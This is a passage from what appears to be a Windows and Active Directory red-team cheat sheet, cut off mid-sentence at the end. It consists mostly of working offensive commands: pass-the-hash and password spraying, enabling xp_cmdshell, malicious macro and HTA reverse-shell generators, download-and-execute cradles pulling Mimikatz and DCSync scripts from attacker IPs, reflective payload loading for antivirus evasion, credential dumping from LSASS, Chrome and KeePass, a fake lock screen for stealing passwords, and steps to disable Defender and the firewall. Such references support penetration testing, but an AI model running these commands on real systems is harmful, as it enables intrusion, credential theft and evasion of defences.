Passwords &amp; Credentials Stored in Emails Invoke-SelfSearch -Mailbox jamie@m0chanAD.local Enumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange Admin Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012 CrackMapExecCrackMapExec is installed on Kali or get Windows Binary from Github. Has 3 Execution Methods crackmapexec smb &lt;- Creating and Running a Service over SMB crackmapexec wmi &lt;- Executes command over WMI crackmapexec at &lt;- Schedules Task with Task Scheduler Can execute plain commands with -X flag i&#x2F;e crcakmapexec smb 10.10.14.0&#x2F;24 -x whoami crcakmapexec smb 10.10.14.0&#x2F;24 &lt;- Host Discovery crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --pass-pol crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --shares Can also PTH with CME crackmapexec smb 10.10.14.0&#x2F;24 -u user -H e8bcd502fbbdcd9379305dca15f4854e cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares --local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS Dump Local SAM hashes crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --local-auth --sam Running Mimikatz crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --local-auth -M mimikatz ^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin Enum AV Products crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --local-auth -M enum_avproducts Mail SniperInvoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019 [*] Now spraying the OWA portal at https:&#x2F;&#x2F;m0chanAD.local&#x2F;owa&#x2F; [*] SUCCESS! User:m0chan:Summer2019 Lmao, you really think Id use the pass Summer2019? Kerberos Stuff#https:&#x2F;&#x2F;gist.github.com&#x2F;TarlogicSecurity&#x2F;2f221924fef8c14a1d8e29f3cb5c5c4a #https:&#x2F;&#x2F;m0chan.github.io&#x2F;Kerberos-Attacks-In-Depth MSSQL Exploiting (PowerUpSQL)#https:&#x2F;&#x2F;github.com&#x2F;NetSPI&#x2F;PowerUpSQL #View SQL Instances Get-SQLInstanceDomain [| Get-SQLServerInfo] #Login in with Domain Account Get-SQLConnectionTestThreaded #Login in with Default Password Get-SQLServerDefaultLoginPw #List DB, Tables &amp; Columns Get-SQLInstanceDomain | Get-SQLDatabase Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt; Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt; #Search Column Names for Word Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10 #Try to Execute Commands (RCE) Invoke-SQLOSCmd #Enable XP_CMDShell Process EXEC sp_configure &#39;show advanced options&#39;, 1; go RECONFIGURE; go EXEC sp_configure &#39;xp_cmdshell&#39;, 1; go RECONFIGURE; go xp_cmdshell &#39;&lt;cmd&gt;&#39; go Malicious Macro with MSBuild#https:&#x2F;&#x2F;github.com&#x2F;infosecn1nja&#x2F;MaliciousMacroMSBuild #https:&#x2F;&#x2F;lolbas-project.github.io&#x2F;lolbas&#x2F;Binaries&#x2F;Msbuild&#x2F; - MSBuild Explained Creation of a Shellcode MSBuild VBA Macro python m3-gen.py -p shellcode -i &#x2F;path&#x2F;beacon.bin -o output.vba Creation of a PowerShell MSBuild VBA Macro python m3-gen.py -p powershell -i &#x2F;path&#x2F;payload.ps1 -o output.vba Creation of a Custom MSBuild VBA Macro python m3-gen.py -p custom -i &#x2F;path&#x2F;msbuild.xml -o output.vba Creation of a Shellcode MSBuild VBA Macro With Kill Date python m3-gen.py -p shellcode -i &#x2F;path&#x2F;beacon.bin -o output.vba -k 20&#x2F;03&#x2F;2018 Creation of a Shellcode MSBuild VBA Macro With Environmental Keying python m3-gen.py -p shellcode -i &#x2F;path&#x2F;beacon.bin -o output.vba -d yourdomain python m3-gen.py -p shellcode -i &#x2F;path&#x2F;beacon.bin -o output.vba -d yourdomain, microsoft, github WeirdHTA - Undetectable HTA#https:&#x2F;&#x2F;github.com&#x2F;felamos&#x2F;weirdhta python3 --help python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell) python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb) python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat) python3 weirdhta.py 10.10.10.10 4444 --command &#39;c:\\windows\\system32\\cmd.exe&#39; (custom command) EvilWinRM#https:&#x2F;&#x2F;github.com&#x2F;Hackplayers&#x2F;evil-winrm Ultimate Shell for WinRM Connections Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] -S, --ssl Enable SSL -c, --pub-key PUBLIC_KEY_PATH Local path to public key certificate -k, --priv-key PRIVATE_KEY_PATH Local path to private key certificate -s, --scripts PS_SCRIPTS_PATH Powershell scripts local path -e, --executables EXES_PATH C# executables local path -i, --ip IP Remote host IP or hostname (required) -U, --url URL Remote url endpoint (default &#x2F;wsman) -u, --user USER Username (required) -p, --password PASS Password -P, --port PORT Remote host port (default 5985) -V, --version Show version -h, --help Display this help message GetVulnerableGPO#https:&#x2F;&#x2F;github.com&#x2F;gpoguy&#x2F;GetVulnerableGPO PowerShell script to find &#39;vulnerable&#39; security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https:&#x2F;&#x2F;sdmsoftware.com&#x2F;group-policy-blog&#x2F;security-related&#x2F;security-fun-bloodhound-ms16-072-gpo-discoverability&#x2F;) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https:&#x2F;&#x2F;s3.amazonaws.com&#x2F;sdmsoftware.com&#x2F;dl&#x2F;SDM-GPMC-Module2.0Setup.zip Invoke-PSImage#https:&#x2F;&#x2F;github.com&#x2F;peewpw&#x2F;Invoke-PSImage Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web. PS&gt;Import-Module .\\Invoke-PSImage.ps1 PS&gt;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\kiwi.jpg [Oneliner to execute from a file] PS&gt;Import-Module .\\Invoke-PSImage.ps1 PS&gt;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\kiwi.jpg -WebRequest [Oneliner to execute from the web] Meterpreter + Donut - Shellcode Injection .NET#https:&#x2F;&#x2F;iwantmore.pizza&#x2F;posts&#x2F;meterpreter-shellcode-inject.html A module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively! donut -f &#x2F;tmp&#x2F;mimikatz.exe -a 2 -o &#x2F;tmp&#x2F;payload.bin use post&#x2F;windows&#x2F;manage&#x2F;shellcode_inject set SHELLCODE &#x2F;tmp&#x2F;payload.bin set SESSION 1 run Privilege EscalationReference: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Run this script: https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat Basicssysteminfo wmic qfe net users hostname whoami net localgroups echo %logonserver% netsh firewall show state netsh firewall show config netstat -an type C:\\Windows\\system32\\drivers\\etc\\hosts PowerUp.ps1 (Sometimes a Quick Win)powershell.exe &#x2F;c IEX(New-Object Net.WebClient).downloadString(&#39;webserver&#x2F;PowerUp.ps1&#39;) ;Invoke-AllChecks SharpUp#https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SharpUp C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded. If It’s AD Get Bloodhound Imported…SharpHound.ps1 SharpHound.exe -&gt; https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;SharpHound IEX(System.Net.WebClient.DownloadString(&#39;http:&#x2F;&#x2F;webserver:4444&#x2F;SharpHound.ps1&#39;)) Invoke-CollectionMethod All Import .zip to Bloodhound If you can&#39;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&#39;s a big big pain but it works. Bloodhound-Pythongit clone https:&#x2F;&#x2F;github.com&#x2F;fox-it&#x2F;BloodHound.py.git cd BloodHound.py&#x2F; &amp;&amp; pip install . bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all Cleartext Passwords# Windows autologin reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot; # VNC reg query &quot;HKCU\\Software\\ORL\\WinVNC3\\Password&quot; # SNMP Parameters reg query &quot;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP&quot; # Putty reg query &quot;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions&quot; # Search for password in registry reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s View Installed Softwaretasklist &#x2F;SVC net start reg query HKEY_LOCAL_MACHINE\\SOFTWARE DRIVERQUERY dir &#x2F;a &quot;C:\\Program Files&quot; dir &#x2F;a &quot;C:\\Program Files (x86)&quot; reg query HKEY_LOCAL_MACHINE\\SOFTWARE Get-ChildItem &#39;C:\\Program Files&#39;, &#39;C:\\Program Files (x86)&#39; | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name Weak Folder PermissionsFull Permissions for &#39;Everyone&#39; on Program Folders icacls &quot;C:\\Program Files\\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot; icacls &quot;C:\\Program Files (x86)\\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot; icacls &quot;C:\\Program Files\\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\\Users&quot; icacls &quot;C:\\Program Files (x86)\\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\\Users&quot; Modify Permissions for Everyone on Program Folders icacls &quot;C:\\Program Files\\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot; icacls &quot;C:\\Program Files (x86)\\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot; icacls &quot;C:\\Program Files\\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\\Users&quot; icacls &quot;C:\\Program Files (x86)\\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\\Users&quot; Scheduled Tasksschtasks &#x2F;query &#x2F;fo LIST &#x2F;v Powershell Historytype C:\\Users\\m0chan\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw View Connected Drivesnet use wmic logicaldisk get caption,description Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\\FileSystem&quot;&#125;| ft Name,Root View Privswhoami &#x2F;priv Look for SeImpersonate, SeDebugPrivilege etc Is Anyone Else Logged In?qwinsta View Registry Auto-Loginreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot; Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon&#39; | select &quot;Default*&quot; View Stored Creds in Credential Managercmdkey &#x2F;list dir C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\ dir C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\ Get-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\ Get-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\ View Unquoted Service Pathswmic service get name,displayname,pathname,startmode 2&gt;nul |findstr &#x2F;i &quot;Auto&quot; 2&gt;nul |findstr &#x2F;i &#x2F;v &quot;C:\\Windows\\\\&quot; 2&gt;nul |findstr &#x2F;i &#x2F;v &quot;&quot;&quot; gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\\Windows*&quot; -and $_.PathName -notlike &#39;&quot;*&#39;&#125; | select PathName,DisplayName,Name View Startup Itemswmic startup get caption,command reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce dir &quot;C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup&quot; dir &quot;C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup&quot; Check for AlwaysInstalledElevated Reg Keyreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer &#x2F;v AlwaysInstallElevated Get-ItemProperty HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer Get-ItemProperty HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer Any Passwords in Registry?reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s Any Sysrep or Unattend Files Left Overdir &#x2F;s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul Get-Childitem –Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where &#123;($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)&#125; GPP (Group Policy Preferences) Passwordssmbclient &#x2F;&#x2F;DOMAINCONTROLLER.local&#x2F;SYSVOL -U m0chan \\m0chanAD.local\\Policies\\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\\USER\\Preferences\\Groups\\ http:&#x2F;&#x2F;www.sec-1.com&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;05&#x2F;gp3finder_v4.0.zip - For Decryption Can also use PowerUP.ps1 Dump Chrome Passwords (Also Post Exploit)#git clone https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;CookieMonster CookieMonster creds CookieMonster.exe cookies -d [domain] -e CookieMonster -a Must be run in the context of the target users as chrome passwords are encrypted with DPAPI. Can also use Mimikatz for this. mimikatz dpapi::chrome &#x2F;in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data&quot; mimikatz dpapi::chrome &#x2F;in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data&quot; &#x2F;unprotect mimikatz dpapi::chrome &#x2F;in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Cookies&quot; &#x2F;unprotect Dump KeePass#https:&#x2F;&#x2F;github.com&#x2F;HarmJ0y&#x2F;KeeThief #http:&#x2F;&#x2F;www.harmj0y.net&#x2F;blog&#x2F;redteaming&#x2F;keethief-a-case-study-in-attacking-keepass-part-2&#x2F; Get-Process keepass tasklist | findstr keepass Attacking KeePass #https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;HarmJ0y&#x2F;KeeThief&#x2F;master&#x2F;PowerShell&#x2F;KeeThief.ps1 Import-Module KeeThief.ps1 Get-KeePassDatabaseKey -Verbose KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used. Token Impersonationhttps:&#x2F;&#x2F;github.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;blob&#x2F;c7985c9bc31e92bb6243c177d7d1d7e68b6f1816&#x2F;Exfiltration&#x2F;Invoke-TokenManipulation.ps1 Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\\domainadminuser&quot; Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; Can also use incognito from meterpreter to steal access&#x2F;delegation tokens and impersonate users. (Requires Admin&#x2F;SYSTEM Privs) #Tokenvator https:&#x2F;&#x2F;github.com&#x2F;0xbadjuju&#x2F;Tokenvator Reflectively Load it with Powershell, Cobalt, SilentTrinity etc... $wc&#x3D;New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0&quot;);$wc.Proxy&#x3D;[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials&#x3D;[System.Net.CredentialCache]::DefaultNetworkCredentials $k&#x3D;&quot;xxxxxxx&quot;;$i&#x3D;0;[byte[]]$b&#x3D;([byte[]]($wc.DownloadData(&quot;https:&#x2F;&#x2F;xxxxx&quot;)))|%&#123;$_-bxor$k[$i++%$k.length]&#125; [System.Reflection.Assembly]::Load($b) | Out-Null $parameters&#x3D;@(&quot;arg1&quot;, &quot;arg2&quot;) [namespace.Class]::Main($parameters) Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra Juicy Potato#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc) #Reference https:&#x2F;&#x2F;ohpe.it&#x2F;juicy-potato&#x2F; Requirements: SeAssignPrimaryTokenPrivilege and&#x2F;or SeImpersonatePrivilege (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.14.5:8000&#x2F;JuicyPotato.exe&#39;,&#39;C:\\Program Files\\Microsoft SQL Server\\MSSQL12.SQLEXPRESS\\MSSQL\\Backup\\JuicyPotato.exe&#39;) JuicyPotato.exe -l 1337 -p C:\\Users\\Public\\Documents\\Mochan.exe -t * -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125; Mochan.exe &#x3D; Payload 5B3E6773-3A99-4A3D-8096-7765DD11785C &#x3D; Target CLISD A CLSID is a GUID that identifies a COM class object Can also use -A flag to specify arguments alongside cmd.exe&#x2F;powershell.exe etc JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL Kerberoasting#Check my Blog Post Kerberos Attacks in Depth for Further Information #https:&#x2F;&#x2F;m0chan.github.io&#x2F;Kerberos-Attacks-In-Depth Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat because Hashcat over John anyday right? Invoke-Kerberoast.ps1 python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local&#x2F;serviceaccount Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually. https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action Kerberoast with Python#https:&#x2F;&#x2F;github.com&#x2F;skelsec&#x2F;kerberoast IMPORTANT: the accepted formats are the following &lt;ldap_connection_string&gt; : &lt;domainname&gt;&#x2F;&lt;username&gt;&#x2F;&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt; &lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;&#x2F;&lt;username&gt;&#x2F;&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt; Look for vulnerable users via LDAP kerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenum Use ASREP roast against users in the ldapenum_asrep_users.txt file kerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txt Use SPN roast against users in the ldapenum_spn_users.txt file kerberoast spnroast &lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt AS Rep Roasting#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable Get-ASRepHash -Domain m0chanAD.local -User victim Can also use Rebeus (Reflectively Load .NET Assembly.) .\\Rubeus.exe asreproast DCSync (Also Post Exploit)#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not allowed to pull password data for users by default. #and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All&#x2F;Replicating Directory Changes) mimikatz # lsadump::dcsync &#x2F;domain:corp.local &#x2F;user:Administrator powershell.exe -Version 2 -Exec Bypass &#x2F;c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.14.6:8000&#x2F;Invoke-DCSync.ps1&#39;); Invoke-DCSync -PWDumpFormat&quot; Empire Module: powershell&#x2F;credentials&#x2F;mimikatz&#x2F;dcsync_hashdump Post ExploitationUseful Commandsnet user m0chan &#x2F;add &#x2F;domain net localgroup Administrators m0chan &#x2F;add # Enable RDP reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f Turn firewall off netsh firewall set opmode disable Or like this reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f If you get this error: CredSSP Error Fix -&gt; Add this reg key: reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f Disable Windows Defender Set-MpPreference -DisableRealtimeMonitoring $true Esenutl.exe Dump Locked FileC:\\WINDOWS\\system32\\esentutl.exe &#x2F;y &lt;SOURCE&gt; &#x2F;vss &#x2F;d &lt;DEST&gt; Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10) Check if Powershell Logging is Enabledreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription Run Seatbelt (ABSOLUTELY MUST)#https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;Seatbelt This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win BasicOSInfo - Basic OS info (i.e. architecture, OS version, etc.) RebootSchedule - Reboot schedule (last 15 days) based on event IDs 12 and 13 TokenGroupPrivs - Current process&#x2F;token privileges (e.g. SeDebugPrivilege&#x2F;etc.) UACSystemPolicies - UAC system policies via the registry PowerShellSettings - PowerShell versions and security settings AuditSettings - Audit settings via the registry WEFSettings - Windows Event Forwarding (WEF) settings via the registry LSASettings - LSA settings (including auth packages) UserEnvVariables - Current user environment variables SystemEnvVariables - Current system environment variables UserFolders - Folders in C:\\Users\\ NonstandardServices - Services with file info company names that don&#39;t contain &#39;Microsoft&#39; InternetSettings - Internet settings including proxy configs LapsSettings - LAPS settings, if installed LocalGroupMembers - Members of local admins, RDP, and DCOM MappedDrives - Mapped drives RDPSessions - Current incoming RDP sessions WMIMappedDrives - Mapped drives via WMI NetworkShares - Network shares FirewallRules - Deny firewall rules, &quot;full&quot; dumps all AntiVirusWMI - Registered antivirus (via WMI) InterestingProcesses - &quot;Interesting&quot; processes- defensive products and admin tools RegistryAutoRuns - Registry autoruns RegistryAutoLogon - Registry autologon information DNSCache - DNS cache entries (via WMI) ARPTable - Lists the current ARP table and adapter information (equivalent to arp -a) AllTcpConnections - Lists current TCP connections and associated processes AllUdpConnections - Lists current UDP connections and associated processes NonstandardProcesses - Running processeswith file info company names that don&#39;t contain &#39;Microsoft&#39; * If the user is in high integrity, the following additional actions are run: SysmonConfig - Sysmon configuration from the registry And more!! Dump Creds(new-object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.14.5:8000&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this. mimikatz.exe privlege::debug sekurlsa::logonPasswords full The safer method is to dump the process memory of LSASS.exe with MiniDump (https:&#x2F;&#x2F;github.com&#x2F;3xpl01tc0d3r&#x2F;Minidump) (or) https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SharpDump and send the .bin to Mimikatz locally. sekurlsa::minidump C:\\users\\m0chan\\lssas.dmp Can also be used for dumping and pass the ticket attacks but will cover this elsewhere. Mimikatz Guide #Logon Sessions sekurlsa::logonPasswords all #Dump Cache lsadump::cache #Dump SAM lsadump::sam Dump Creds #2#https:&#x2F;&#x2F;github.com&#x2F;AlessandroZ&#x2F;LaZagne laZagne.exe all laZagne.exe browsers laZagne.exe browsers -firefox SessionGopher#https:&#x2F;&#x2F;github.com&#x2F;Arvanaghi&#x2F;SessionGopher Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals Invoke-SessionGopher -Thorough Import-Module path\\to\\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss Dump Chrome Passwords (Also Post Exploit)#git clone https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;CookieMonster CookieMonster creds CookieMonster.exe cookies -d [domain] -e CookieMonster -a Must be run in the context of the target users as chrome passwords are encrypted with DPAPI. Can also use Mimikatz for this. mimikatz dpapi::chrome &#x2F;in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data&quot; mimikatz dpapi::chrome &#x2F;in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data&quot; &#x2F;unprotect mimikatz dpapi::chrome &#x2F;in:&quot;C:\\Users\\m0chan\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Cookies&quot; &#x2F;unprotect Dump Process Memory w/ Mimikittenz#https:&#x2F;&#x2F;github.com&#x2F;putterpanda&#x2F;mimikittenz mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes. The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target. Invoke-Mimikittenz Dump KeePass#https:&#x2F;&#x2F;github.com&#x2F;HarmJ0y&#x2F;KeeThief #http:&#x2F;&#x2F;www.harmj0y.net&#x2F;blog&#x2F;redteaming&#x2F;keethief-a-case-study-in-attacking-keepass-part-2&#x2F; Get-Process keepass tasklist | findstr keepass Attacking KeePass #https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;HarmJ0y&#x2F;KeeThief&#x2F;master&#x2F;PowerShell&#x2F;KeeThief.ps1 Import-Module KeeThief.ps1 Get-KeePassDatabaseKey -Verbose KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used. pypykatz#https:&#x2F;&#x2F;github.com&#x2F;skelsec&#x2F;pypykatz Full python implementation of Mimikatz :D pip3 install pypykatz SafetyKatz#https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SafetyKatz Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D &quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&#39;s .NET PE Loader. First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\\Windows\\Temp\\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot; SharpDPAPI#https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SharpDPAPI Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features. SharpSniper#https:&#x2F;&#x2F;github.com&#x2F;HunnicCyber&#x2F;SharpSniper Often a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO. SharpSniper is a simple tool to find the IP address of these users so that you can target their box. C:\\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123 User: emusk - IP Address: 192.168.37.130 SharpLocker#https:&#x2F;&#x2F;github.com&#x2F;Pickfordmatt&#x2F;SharpLocker SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike. Check for Missing KB’swatson.exe Sherlock.ps1 Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc) https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;Watson Decrypt EFS Files with Mimikatz if Admin/System#https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz&#x2F;wiki&#x2F;howto-~-decrypt-EFS-files cipher &#x2F;c &quot;d:\\Users\\Gentil Kiwi\\Documents\\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz. privilege::debug token::elevate crypto::system &#x2F;file:&quot;D:\\Users\\Gentil 